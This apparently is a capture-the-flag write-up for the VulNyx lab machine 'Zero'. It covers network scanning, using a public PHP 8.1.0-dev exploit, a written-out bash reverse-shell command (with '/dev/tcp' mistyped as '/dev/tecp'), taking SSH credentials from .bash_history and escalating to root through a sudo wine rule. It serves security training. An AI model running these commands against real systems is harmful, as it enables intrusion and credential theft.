<h1 align="center"> Zero </h1> <br>

[![code with hearth by NHN Cloud](https://img.shields.io/badge/Pwned%20with%20%E2%99%A5%20by-X5K0-ff1414.svg)](https://github.com/X5K0)
<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="Zero" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/ZeroLogo.png" width="550">
  </a>
</p>

<p align="center">
  You can find the machine in the link below
</p>

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="Download on VulNyx" title="VulNyx" src="https://github.com/X5K0/CTF-Area/blob/main/VulNyx/Load/Pictures/GetItOnVulNyx.png" width="140">
  </a>
</p>

## 🚩 Table of Contents

- [Reconnaissance](#-reconnaissance)
- [Exploitation](#-exploitation)
- [Privilege Escalation](#-privilege-escalation)



## 🔎 Reconnaissance

[![Nmap](https://img.shields.io/badge/nmap-red?style=flat)]()
[![ARP-Scan](https://img.shields.io/badge/arp--scan-blue?style=flat)]()
[![BurpSuite](https://img.shields.io/badge/BurpSuite-purple?style=flat)]()

To start this machine, we will perform an initial scan using ARP-scan:

```bash
sudo arp-scan -l
```
<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/ARP-Scan.png" width="900">
  </a>
</p>

With nmap, we can see the open ports on the target system. To do this, we will execute the command:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "IP"
```

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Nmap.png" width="900">
  </a>
</p>


As we can see, port 80 and port 8080 both lead to the same page.

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Web.png" width="900">
  </a>
</p>

If we perform a directory scan, we won't find anything, so our next step is to intercept the request using **BurpSuite**.

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/BurpSuite_Intercept.png">
  </a>
</p>

Once intercepted, we will send it to the Repeater with CTRL+R to obtain more detailed information about the server's response.

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Burpsuite_Repeater.png" width="900">
  </a>
</p>

We see that it is using PHP 8.1.0-dev, which indicates that it is a development version and may contain vulnerabilities. We will search on [exploit-DB](https://www.exploit-db.com/) for that specific version to see if there are any vulnerabilities. We will find the following:

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/ExploitDB_Web.png" width="900">
  </a>
</p>

As we can see, there is a vulnerability that allows us to access the system through a Python script.




## 👨‍💻 Exploitation
[![Python](https://img.shields.io/badge/Python-blue?style=flat)]()
[![Bash](https://img.shields.io/badge/Bash-brown?style=flat)]()

We will download the exploit and examine its internal structure.


<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Exploit.png" width="900">
  </a>
</p>

If we execute it by providing the victim's URL as an argument, we will gain direct access to the system. At this point, we can integrate a reverse shell so that we have a remote shell on our machine using the command:

```bash
bash -c "bash -i >& /dev/tecp/"IP"/"PORT" 0>&1"
```

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Docker1.png" width="900">
  </a>
</p>

As we can see, we are logged in as the root user, but we are not within the actual system, rather within Docker.

To view the command history written by this user, we will navigate to their home directory and search within the .bash_history file.

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/credenciales_SSH.png">
  </a>
</p>

We see that there are SSH access credentials. We will attempt to access using those credentials.

Upon attempting to access, we will succeed. At this moment, we are in the actual operating system of the machine as the user liam.

We can manipulate the TTY as follows:

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Tratamiento_TTY.png">
  </a>
</p>

We will enumerate files and directories within their personal directory to see if the flag is there, which we will successfully obtain. 🏳️


## 🔥 Privilege Escalation
[![Bash](https://img.shields.io/badge/Bash-brown?style=flat)]()

In this case, we will attempt to view the permissions we have on the system using:

```bash
sudo -l
```
<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Sudo-L.png" width="900">
  </a>
</p>

We see that we can execute wine as root without needing to provide credentials.

> [!TIP]
> #### What is wine?
> 
> Wine is a compatibility layer capable of running Windows applications on several POSIX-compliant operating systems, such as Linux, macOS, & BSD.

Knowing this, we can deduce that if we execute the command as the root user, providing a command prompt, we will be able to access as an administrator.

This command prompt will be CMD.

<p align="center">
  <a href="https://vulnyx.com/">
    <img alt="GitPoint" title="GitPoint" src="https://github.com/X5K0/CTF-Arena/blob/main/VulNyx/Zero/Pictures/Sudo-L.png" width="900">
  </a>
</p>

We see that we have become the root user of the system, so we can navigate to their personal directory and view the flag. 🏳️
